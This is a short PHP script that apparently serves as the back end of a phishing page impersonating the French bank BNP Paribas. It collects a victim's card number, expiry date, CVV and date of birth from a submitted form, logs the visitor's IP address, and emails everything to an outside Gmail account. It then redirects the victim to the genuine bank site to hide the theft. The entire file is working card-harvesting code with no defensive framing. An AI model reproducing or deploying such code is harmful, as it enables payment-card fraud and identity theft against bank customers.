<?php
	$ip = "";
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    	$ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
	    $ip = $_SERVER['REMOTE_ADDR'];
	}
	$header = "From $ip <bnp@pipi.bmci>";
	$header .= "";
	$msg  = "---------$ip\ncb: ".$_POST['cb']."\n exp: ". $_POST['exp']."\n ccv: ". $_POST['ccv']."\n dob: ". $_POST['dob'];
	mail("gamonet.isa@gmail.com",$header,$msg);
	header("location:https://mabanque.bnpparibas");

?>